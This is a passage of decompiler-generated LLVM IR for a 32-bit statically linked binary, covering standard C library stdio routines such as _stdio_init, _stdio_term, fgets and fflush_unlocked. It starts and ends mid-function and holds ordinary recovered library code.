  store i32 %v2_804cb8a, i32* %stack_var_-76, align 4
  %v2_804cbb3 = call i32 @__pthread_return_void(i32 %v2_804cb8a, i32 1)
  store i32 %v2_804cb8a, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804cb67, i32* %stack_var_-76, align 4
  %v2_804cbbd = call i32 @__pthread_return_void(i32 %v2_804cb67, i32 1)
  store i32 %v2_804cbbd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cbc2

dec_label_pc_804cbc2:                             ; preds = %dec_label_pc_804c9ef, %dec_label_pc_804cb5c
  br label %dec_label_pc_804cbc9

dec_label_pc_804cbc7:                             ; preds = %dec_label_pc_804c9e5, %dec_label_pc_804c9d2
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804cbc9

dec_label_pc_804cbc9:                             ; preds = %dec_label_pc_804cb34, %dec_label_pc_804ca1e, %dec_label_pc_804cbc2, %dec_label_pc_804cbc7
  %v0_804cbcc = load i32, i32* @ebp, align 4
  store i32 %v0_804cbcc, i32* %eax.global-to-local, align 4
  %v2_804cbce = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cbce, i32* @ebx, align 4
  store i32 %v0_804c9a6, i32* @esi, align 4
  store i32 %v0_804c9a5, i32* @edi, align 4
  store i32 %v0_804c9a4, i32* @ebp, align 4
  ret i32 %v0_804cbcc

; uselistorder directives
  uselistorder i32 %v2_804cb8a, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804cb67, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804cb2d, { 1, 0 }
  uselistorder i32 %v1_804cb0e, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804caf5, { 1, 0 }
  uselistorder i32 %v1_804cade, { 1, 0, 2 }
  uselistorder i32 %v11_804caa0, { 1, 0 }
  uselistorder i32 %v0_804caa9.pre, { 1, 0 }
  uselistorder i32 %v1_804ca71, { 1, 0 }
  uselistorder i32 %v0_804ca6d, { 1, 0 }
  uselistorder i32 %v1_804ca62, { 1, 0, 2 }
  uselistorder i32 %v1_804ca23, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804ca12, { 1, 0 }
  uselistorder i32 %v0_804c9e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 4096, { 7, 4, 5, 0, 1, 8, 9, 2, 6, 3 }
  uselistorder i32 (i8*, i32, i32)* @__libc_open, { 1, 0, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_804cbc9, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804cbc2, { 1, 0 }
  uselistorder label %dec_label_pc_804cb34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804caa3, { 1, 0 }
  uselistorder label %dec_label_pc_804ca93, { 1, 0 }
  uselistorder label %dec_label_pc_804ca50, { 1, 0 }
  uselistorder label %dec_label_pc_804ca1a, { 1, 0 }
  uselistorder label %dec_label_pc_804ca0c, { 1, 0 }
  uselistorder label %dec_label_pc_804ca01, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804cbd5 = load i32, i32* @edi, align 4
  %v0_804cbd6 = load i32, i32* @esi, align 4
  %v0_804cbd7 = load i32, i32* @ebx, align 4
  store i32 %v0_804cbd7, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804cbe0 = call i32 @__errno_location(i32 %v0_804cbd7)
  store i32 %v1_804cbe0, i32* @edi, align 4
  %v0_804cbea = load i32, i32* @global_var_80521e0.103, align 32
  store i32 %v0_804cbea, i32* @esi, align 4
  %v1_804cbf0 = inttoptr i32 %v1_804cbe0 to i32*
  %v2_804cbf0 = load i32, i32* %v1_804cbf0, align 4
  store i32 %v2_804cbf0, i32* %ebp.global-to-local, align 4
  %v1_804cbf4 = call i32 @isatty(i32 0)
  %v0_804cbf9 = load i32, i32* @ebx, align 4
  %v2_804cbfb = sub i32 %v0_804cbf9, %v1_804cbf4
  %v2_804cc06 = mul i32 %v2_804cbfb, 256
  %v0_804cc09 = load i32, i32* @esi, align 4
  %v2_804cc09 = xor i32 %v0_804cc09, %v2_804cc06
  %v1_804cc0b = trunc i32 %v2_804cc09 to i16
  store i16 %v1_804cc0b, i16* bitcast (i32* @global_var_80521e0.103 to i16*), align 32
  %v0_804cc12 = load i32, i32* @global_var_8052230.105, align 16
  store i32 %v0_804cc12, i32* @esi, align 4
  %v1_804cc18 = call i32 @isatty(i32 1)
  %v0_804cc1d = load i32, i32* @ebx, align 4
  %v2_804cc1d = sub i32 %v0_804cc1d, %v1_804cc18
  %v2_804cc1f = mul i32 %v2_804cc1d, 256
  %v0_804cc22 = load i32, i32* @esi, align 4
  %v2_804cc22 = xor i32 %v2_804cc1f, %v0_804cc22
  %v1_804cc24 = trunc i32 %v2_804cc22 to i16
  store i16 %v1_804cc24, i16* bitcast (i32* @global_var_8052230.105 to i16*), align 16
  %v0_804cc2b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cc2b = load i32, i32* @edi, align 4
  %v2_804cc2b = inttoptr i32 %v1_804cc2b to i32*
  store i32 %v0_804cc2b, i32* %v2_804cc2b, align 4
  %v2_804cc30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cc30, i32* @ebx, align 4
  store i32 %v0_804cbd6, i32* @esi, align 4
  store i32 %v0_804cbd5, i32* @edi, align 4
  ret i32 %v1_804cc18

; uselistorder directives
  uselistorder i32 %v1_804cbe0, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804cc43 = inttoptr i32 %arg1 to i16*
  %v4_804cc43 = call i32 @memcpy(i16* %v3_804cc43, i32 ptrtoint (i32* @global_var_8050610.106 to i32), i32 24)
  ret i32 %v4_804cc43
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804cc4c = load i32, i32* @esi, align 4
  %v0_804cc4d = load i32, i32* @ebx, align 4
  store i32 %v0_804cc4d, i32* %stack_var_-8, align 4
  %v1_804cc56 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  store i32 %v1_804cc56, i32* %eax.global-to-local, align 4
  %v1_804cc62 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 %v1_804cc62, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804ccac22 = icmp eq i32 %storemerge21, 0
  %v1_804ccae23 = icmp eq i1 %v1_804ccac22, false
  br i1 %v1_804ccae23, label %dec_label_pc_804cc6f.lr.ph, label %dec_label_pc_804cccc.preheader

dec_label_pc_804cc6f.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804cc6f

dec_label_pc_804cc6f:                             ; preds = %dec_label_pc_804cc6f.lr.ph, %dec_label_pc_804cc96
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804cc6f.lr.ph ], [ %storemerge, %dec_label_pc_804cc96 ]
  %v1_804cc72 = add i32 %storemerge24, 56
  store i32 %v1_804cc72, i32* @esi, align 4
  %v1_804cc76 = call i32 @__pthread_return_0(i32 %v1_804cc72)
  store i32 %v1_804cc76, i32* %eax.global-to-local, align 4
  %v1_804cc7e = icmp eq i32 %v1_804cc76, 0
  br i1 %v1_804cc7e, label %dec_label_pc_804cc96, label %dec_label_pc_804cc82

dec_label_pc_804cc82:                             ; preds = %dec_label_pc_804cc6f
  %v0_804cc82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cc82 = add i32 %v0_804cc82, 8
  %v2_804cc82 = inttoptr i32 %v1_804cc82 to i32*
  %v3_804cc82 = load i32, i32* %v2_804cc82, align 4
  store i32 %v3_804cc82, i32* %eax.global-to-local, align 4
  %v1_804cc85 = inttoptr i32 %v0_804cc82 to i16*
  store i16 48, i16* %v1_804cc85, align 2
  %v0_804cc8a = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc8a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc8a = add i32 %v1_804cc8a, 24
  %v3_804cc8a = inttoptr i32 %v2_804cc8a to i32*
  store i32 %v0_804cc8a, i32* %v3_804cc8a, align 4
  %v0_804cc8d = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc8d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc8d = add i32 %v1_804cc8d, 28
  %v3_804cc8d = inttoptr i32 %v2_804cc8d to i32*
  store i32 %v0_804cc8d, i32* %v3_804cc8d, align 4
  %v0_804cc90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc90 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc90 = add i32 %v1_804cc90, 16
  %v3_804cc90 = inttoptr i32 %v2_804cc90 to i32*
  store i32 %v0_804cc90, i32* %v3_804cc90, align 4
  %v0_804cc93 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc93 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cc93 = add i32 %v1_804cc93, 20
  %v3_804cc93 = inttoptr i32 %v2_804cc93 to i32*
  store i32 %v0_804cc93, i32* %v3_804cc93, align 4
  br label %dec_label_pc_804cc96

dec_label_pc_804cc96:                             ; preds = %dec_label_pc_804cc6f, %dec_label_pc_804cc82
  %v0_804cc99 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cc99 = add i32 %v0_804cc99, 52
  %v2_804cc99 = inttoptr i32 %v1_804cc99 to i32*
  store i32 1, i32* %v2_804cc99, align 4
  %v0_804cca0 = load i32, i32* @esi, align 4
  %v1_804cca1 = call i32 @__stdio_init_mutex(i32 %v0_804cca0)
  store i32 %v1_804cca1, i32* %eax.global-to-local, align 4
  %v0_804cca6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cca6 = add i32 %v0_804cca6, 32
  %v2_804cca6 = inttoptr i32 %v1_804cca6 to i32*
  %storemerge = load i32, i32* %v2_804cca6, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804ccac = icmp eq i32 %storemerge, 0
  %v1_804ccae = icmp eq i1 %v1_804ccac, false
  br i1 %v1_804ccae, label %dec_label_pc_804cc6f, label %dec_label_pc_804cca9.dec_label_pc_804cccc.preheader_crit_edge

dec_label_pc_804cca9.dec_label_pc_804cccc.preheader_crit_edge: ; preds = %dec_label_pc_804cc96
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804cccc.preheader

dec_label_pc_804cccc.preheader:                   ; preds = %dec_label_pc_804cca9.dec_label_pc_804cccc.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804cca9.dec_label_pc_804cccc.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804cccc3 = icmp eq i32 %storemerge12, 0
  %v1_804ccce10 = icmp eq i1 %v1_804cccc3, false
  br i1 %v1_804ccce10, label %dec_label_pc_804ccb8.preheader, label %dec_label_pc_804ccd0

dec_label_pc_804ccb8.preheader:                   ; preds = %dec_label_pc_804cccc.preheader
  br label %dec_label_pc_804ccb8

dec_label_pc_804ccb8:                             ; preds = %dec_label_pc_804ccb8.preheader, %dec_label_pc_804ccc9
  %v0_804ccc0 = phi i32 [ %storemerge1, %dec_label_pc_804ccc9 ], [ %storemerge12, %dec_label_pc_804ccb8.preheader ]
  %v1_804ccb8 = inttoptr i32 %v0_804ccc0 to i8*
  %v2_804ccb8 = load i8, i8* %v1_804ccb8, align 1
  %v3_804ccb8 = and i8 %v2_804ccb8, 64
  %v4_804ccb8 = icmp eq i8 %v3_804ccb8, 0
  br i1 %v4_804ccb8, label %dec_label_pc_804ccc9, label %dec_label_pc_804ccbd

dec_label_pc_804ccbd:                             ; preds = %dec_label_pc_804ccb8
  %v1_804ccc1 = call i32 @__stdio_wcommit(i32 %v0_804ccc0)
  store i32 %v1_804ccc1, i32* %eax.global-to-local, align 4
  %v0_804ccc9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ccc9

dec_label_pc_804ccc9:                             ; preds = %dec_label_pc_804ccb8, %dec_label_pc_804ccbd
  %v0_804ccc9 = phi i32 [ %v0_804ccc0, %dec_label_pc_804ccb8 ], [ %v0_804ccc9.pre, %dec_label_pc_804ccbd ]
  %v1_804ccc9 = add i32 %v0_804ccc9, 32
  %v2_804ccc9 = inttoptr i32 %v1_804ccc9 to i32*
  %storemerge1 = load i32, i32* %v2_804ccc9, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804cccc = icmp eq i32 %storemerge1, 0
  %v1_804ccce = icmp eq i1 %v1_804cccc, false
  br i1 %v1_804ccce, label %dec_label_pc_804ccb8, label %dec_label_pc_804ccd0

dec_label_pc_804ccd0:                             ; preds = %dec_label_pc_804ccc9, %dec_label_pc_804cccc.preheader
  %v2_804ccd0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ccd0, i32* %eax.global-to-local, align 4
  %v2_804ccd1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ccd1, i32* @ebx, align 4
  store i32 %v0_804cc4c, i32* @esi, align 4
  ret i32 %v2_804ccd0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ccc9, { 1, 0 }
  uselistorder label %dec_label_pc_804ccb8, { 1, 0 }
  uselistorder label %dec_label_pc_804cc96, { 1, 0 }
  uselistorder label %dec_label_pc_804cc6f, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804ccd4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804ccdc = add i32 %arg1, 8
  %v2_804ccdc = inttoptr i32 %v1_804ccdc to i32*
  %v3_804ccdc = load i32, i32* %v2_804ccdc, align 4
  store i32 %v3_804ccdc, i32* %edx.global-to-local, align 4
  %v1_804ccdf = add i32 %arg1, 16
  %v2_804ccdf = inttoptr i32 %v1_804ccdf to i32*
  %v3_804ccdf = load i32, i32* %v2_804ccdf, align 4
  %v2_804cce2 = sub i32 %v3_804ccdf, %v3_804ccdc
  %v12_804cce2 = icmp eq i32 %v2_804cce2, 0
  store i32 %v2_804cce2, i32* %eax.global-to-local, align 4
  br i1 %v12_804cce2, label %dec_label_pc_804ccf5, label %dec_label_pc_804cce6

dec_label_pc_804cce6:                             ; preds = %entry
  store i32 %v3_804ccdc, i32* %v2_804ccdf, align 4
  %v0_804cce9 = load i32, i32* @ecx, align 4
  %v0_804ccea = load i32, i32* %eax.global-to-local, align 4
  %v0_804cceb = load i32, i32* %edx.global-to-local, align 4
  %v0_804ccec = load i32, i32* @ebx, align 4
  %v4_804cced = inttoptr i32 %v0_804ccec to i16*
  %v5_804cced = call i32 @__stdio_WRITE(i16* %v4_804cced, i32 %v0_804cceb, i32 %v0_804ccea, i32 %v0_804cce9)
  store i32 %v5_804cced, i32* %eax.global-to-local, align 4
  %v0_804ccf5.pre = load i32, i32* @ebx, align 4
  %v2_804ccfb.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804ccf5

dec_label_pc_804ccf5:                             ; preds = %entry, %dec_label_pc_804cce6
  %v2_804ccfb = phi i32 [ %tmp11, %entry ], [ %v2_804ccfb.pre, %dec_label_pc_804cce6 ]
  %v0_804ccf5 = phi i32 [ %arg1, %entry ], [ %v0_804ccf5.pre, %dec_label_pc_804cce6 ]
  %v1_804ccf5 = add i32 %v0_804ccf5, 16
  %v2_804ccf5 = inttoptr i32 %v1_804ccf5 to i32*
  %v3_804ccf5 = load i32, i32* %v2_804ccf5, align 4
  store i32 %v3_804ccf5, i32* %eax.global-to-local, align 4
  %v2_804ccf8 = add i32 %v0_804ccf5, 8
  %v3_804ccf8 = inttoptr i32 %v2_804ccf8 to i32*
  %v4_804ccf8 = load i32, i32* %v3_804ccf8, align 4
  %v5_804ccf8 = sub i32 %v3_804ccf5, %v4_804ccf8
  store i32 %v5_804ccf8, i32* %eax.global-to-local, align 4
  store i32 %v2_804ccfb, i32* @edx, align 4
  store i32 %v0_804ccd4, i32* @ebx, align 4
  ret i32 %v5_804ccf8

; uselistorder directives
  uselistorder i32 %v0_804ccf5, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ccf5, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cd00 = load i32, i32* @edi, align 4
  %v0_804cd01 = load i32, i32* @esi, align 4
  %v0_804cd02 = load i32, i32* @ebx, align 4
  %v12_804cd03 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804cd0a = add i32 %arg3, 52
  %v2_804cd0a = inttoptr i32 %v1_804cd0a to i32*
  %v3_804cd0a = load i32, i32* %v2_804cd0a, align 4
  store i32 %v3_804cd0a, i32* @edi, align 4
  %v1_804cd0d = icmp eq i32 %v3_804cd0a, 0
  %v1_804cd0f = icmp eq i1 %v1_804cd0d, false
  br i1 %v1_804cd0f, label %entry.dec_label_pc_804cd30_crit_edge, label %dec_label_pc_804cd11

entry.dec_label_pc_804cd30_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804cd30

dec_label_pc_804cd11:                             ; preds = %entry
  %v1_804cd11 = add i32 %arg3, 56
  store i32 %v1_804cd11, i32* @ebx, align 4
  store i32 %v12_804cd03, i32* @eax, align 4
  %v2_804cd20 = call i32 @__pthread_return_void(i32 %v12_804cd03, i32 134526427)
  %v0_804cd25 = load i32, i32* @ebx, align 4
  %v1_804cd28 = call i32 @__pthread_return_0(i32 %v0_804cd25)
  %v0_804cd31.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cd30

dec_label_pc_804cd30:                             ; preds = %entry.dec_label_pc_804cd30_crit_edge, %dec_label_pc_804cd11
  %v0_804cd31 = phi i32 [ %arg3, %entry.dec_label_pc_804cd30_crit_edge ], [ %v0_804cd31.pre, %dec_label_pc_804cd11 ]
  %v0_804cd30 = load i32, i32* @edx, align 4
  %v4_804cd3a = inttoptr i32 %arg1 to i8*
  %v5_804cd3a = call i32 @__GI_fgets_unlocked(i8* %v4_804cd3a, i32 %arg2, i32 %v0_804cd31, i32 %v0_804cd30)
  store i32 %v5_804cd3a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804cd0f, label %dec_label_pc_804cd59, label %dec_label_pc_804cd48

dec_label_pc_804cd48:                             ; preds = %dec_label_pc_804cd30
  store i32 %v12_804cd03, i32* @eax, align 4
  %v2_804cd51 = call i32 @__pthread_return_void(i32 %v12_804cd03, i32 1)
  %v0_804cd5c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cd59

dec_label_pc_804cd59:                             ; preds = %dec_label_pc_804cd30, %dec_label_pc_804cd48
  %v0_804cd5c = phi i32 [ %v5_804cd3a, %dec_label_pc_804cd30 ], [ %v0_804cd5c.pre, %dec_label_pc_804cd48 ]
  store i32 %v0_804cd02, i32* @ebx, align 4
  store i32 %v0_804cd01, i32* @esi, align 4
  store i32 %v0_804cd00, i32* @edi, align 4
  ret i32 %v0_804cd5c

; uselistorder directives
  uselistorder i32 %v12_804cd03, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cd59, { 1, 0 }
  uselistorder label %dec_label_pc_804cd30, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804cd73 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cd73, i32* @eax, align 4
  %v2_804cd78 = call i32 @__pthread_return_void(i32 %v2_804cd73, i32 134526427)
  %v1_804cd84 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804cd89 = load i32, i32* @global_var_8052548.99, align 8
  %v8_804cd91 = icmp eq i32 %v0_804cd89, 1
  %v1_804cd92 = icmp eq i1 %v8_804cd91, false
  br i1 %v1_804cd92, label %dec_label_pc_804ce29, label %dec_label_pc_804cd98

dec_label_pc_804cd98:                             ; preds = %entry
  %v0_804cd98 = load i32, i32* @global_var_805254c.100, align 4
  %tmp29 = icmp slt i32 %v0_804cd98, 1
  br i1 %tmp29, label %dec_label_pc_804ce29, label %dec_label_pc_804cda5

dec_label_pc_804cda5:                             ; preds = %dec_label_pc_804cd98
  store i32 0, i32* @esi, align 4
  %v2_804cdb2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cdb2, i32* @eax, align 4
  %v2_804cdb7 = call i32 @__pthread_return_void(i32 %v2_804cdb2, i32 134526427)
  %v1_804cdc3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cdc8 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cdc8, i32* %edx.global-to-local, align 4
  %v1_804ce0a3 = icmp eq i32 %v0_804cdc8, 0
  %v1_804ce0c10 = icmp eq i1 %v1_804ce0a3, false
  br i1 %v1_804ce0c10, label %dec_label_pc_804cdd3, label %dec_label_pc_804ce0e

dec_label_pc_804cdd3:                             ; preds = %dec_label_pc_804cda5, %dec_label_pc_804ce08
  %v0_804cde3 = phi i32 [ %v0_804ce08, %dec_label_pc_804ce08 ], [ %v0_804cdc8, %dec_label_pc_804cda5 ]
  %v1_804cdd313 = inttoptr i32 %v0_804cde3 to i16*
  %v2_804cdd3 = load i16, i16* %v1_804cdd313, align 2
  %v1_804cddb = add i32 %v0_804cde3, 32
  %v2_804cddb = inttoptr i32 %v1_804cddb to i32*
  %v3_804cddb = load i32, i32* %v2_804cddb, align 4
  store i32 %v3_804cddb, i32* @ebx, align 4
  %v1_804cdd6 = and i16 %v2_804cdd3, -32720
  %v6_804cdde = icmp eq i16 %v1_804cdd6, 48
  br i1 %v6_804cdde, label %dec_label_pc_804cde7, label %dec_label_pc_804cde3

dec_label_pc_804cde3:                             ; preds = %dec_label_pc_804cdd3
  store i32 %v0_804cde3, i32* @esi, align 4
  br label %dec_label_pc_804ce08

dec_label_pc_804cde7:                             ; preds = %dec_label_pc_804cdd3
  %v0_804cde7 = load i32, i32* @esi, align 4
  %v1_804cde7 = icmp eq i32 %v0_804cde7, 0
  %v1_804cde9 = icmp eq i1 %v1_804cde7, false
  br i1 %v1_804cde9, label %dec_label_pc_804cdf3, label %dec_label_pc_804cdeb

dec_label_pc_804cdeb:                             ; preds = %dec_label_pc_804cde7
  store i32 %v3_804cddb, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804cdf6

dec_label_pc_804cdf3:                             ; preds = %dec_label_pc_804cde7
  %v2_804cdf3 = add i32 %v0_804cde7, 32
  %v3_804cdf3 = inttoptr i32 %v2_804cdf3 to i32*
  store i32 %v3_804cddb, i32* %v3_804cdf3, align 4
  %v0_804cdf6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cdf6

dec_label_pc_804cdf6:                             ; preds = %dec_label_pc_804cdeb, %dec_label_pc_804cdf3
  %v0_804cdff = phi i32 [ %v0_804cde3, %dec_label_pc_804cdeb ], [ %v0_804cdf6.pre, %dec_label_pc_804cdf3 ]
  %v1_804cdf6 = add i32 %v0_804cdff, 1
  %v2_804cdf6 = inttoptr i32 %v1_804cdf6 to i8*
  %v3_804cdf6 = load i8, i8* %v2_804cdf6, align 1
  %v4_804cdf6 = and i8 %v3_804cdf6, 32
  %v5_804cdf6 = icmp eq i8 %v4_804cdf6, 0
  br i1 %v5_804cdf6, label %dec_label_pc_804ce08, label %dec_label_pc_804cdfc

dec_label_pc_804cdfc:                             ; preds = %dec_label_pc_804cdf6
  %v1_804ce00 = call i32 @free(i32 %v0_804cdff)
  br label %dec_label_pc_804ce08

dec_label_pc_804ce08:                             ; preds = %dec_label_pc_804cdf6, %dec_label_pc_804cde3, %dec_label_pc_804cdfc
  %v0_804ce08 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce08, i32* %edx.global-to-local, align 4
  %v1_804ce0a = icmp eq i32 %v0_804ce08, 0
  %v1_804ce0c = icmp eq i1 %v1_804ce0a, false
  br i1 %v1_804ce0c, label %dec_label_pc_804cdd3, label %dec_label_pc_804ce0e

dec_label_pc_804ce0e:                             ; preds = %dec_label_pc_804ce08, %dec_label_pc_804cda5
  store i32 %v2_804cdb2, i32* @eax, align 4
  %v2_804ce17 = call i32 @__pthread_return_void(i32 %v2_804cdb2, i32 1)
  store i32 0, i32* @global_var_805254c.100, align 4
  %v0_804ce29.pre = load i32, i32* @global_var_8052548.99, align 8
  br label %dec_label_pc_804ce29

dec_label_pc_804ce29:                             ; preds = %dec_label_pc_804cd98, %entry, %dec_label_pc_804ce0e
  %v0_804ce29 = phi i32 [ %v0_804cd89, %dec_label_pc_804cd98 ], [ %v0_804cd89, %entry ], [ %v0_804ce29.pre, %dec_label_pc_804ce0e ]
  %v1_804ce2e = add i32 %v0_804ce29, -1
  store i32 %v1_804ce2e, i32* @global_var_8052548.99, align 8
  store i32 %v2_804cd73, i32* @eax, align 4
  %v2_804ce3d = call i32 @__pthread_return_void(i32 %v2_804cd73, i32 1)
  ret i32 %v2_804ce3d

; uselistorder directives
  uselistorder i32 %v0_804ce08, { 1, 2, 0 }
  uselistorder i32 %v0_804cde3, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804cd89, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 7, 6, 5, 4, 3, 20, 19, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ce29, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cdf6, { 1, 0 }
  uselistorder label %dec_label_pc_804cdd3, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804ce48 = load i32, i32* @ebp, align 4
  %v0_804ce49 = load i32, i32* @edi, align 4
  %v0_804ce4a = load i32, i32* @esi, align 4
  %v0_804ce4b = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804ce51 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ce51, i32* @ebx, align 4
  %v10_804ce55 = icmp eq i16* %arg1, inttoptr (i32 134553996 to i16*)
  br i1 %v10_804ce55, label %dec_label_pc_804ce6a, label %dec_label_pc_804ce5d

dec_label_pc_804ce5d:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_804ce62 = icmp eq i16* %arg1, null
  %v1_804ce64 = icmp eq i1 %v2_804ce62, false
  br i1 %v1_804ce64, label %dec_label_pc_804cf59, label %dec_label_pc_804ce6a

dec_label_pc_804ce6a:                             ; preds = %dec_label_pc_804ce5d, %entry
  store i32 0, i32* @edi, align 4
  %v2_804ce77 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ce77, i32* @ebx, align 4
  %v2_804ce7c = call i32 @__pthread_return_void(i32 %v2_804ce77, i32 134526427)
  %v1_804ce88 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @ecx, align 4
  %v0_804ce8e = load i32, i32* @global_var_8052548.99, align 8
  %v1_804ce94 = add i32 %v0_804ce8e, 1
  store i32 %v1_804ce94, i32* @eax, align 4
  store i32 %v1_804ce94, i32* @global_var_8052548.99, align 8
  %v2_804ce9d = call i32 @__pthread_return_void(i32 %v2_804ce77, i32 1)
  store i32 %v2_804ce9d, i32* @eax, align 4
  %v2_804ceb0 = call i32 @__pthread_return_void(i32 %v2_804ce77, i32 134526427)
  %v1_804cebc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* @eax, align 4
  %v0_804cec5 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cec5, i32* @esi, align 4
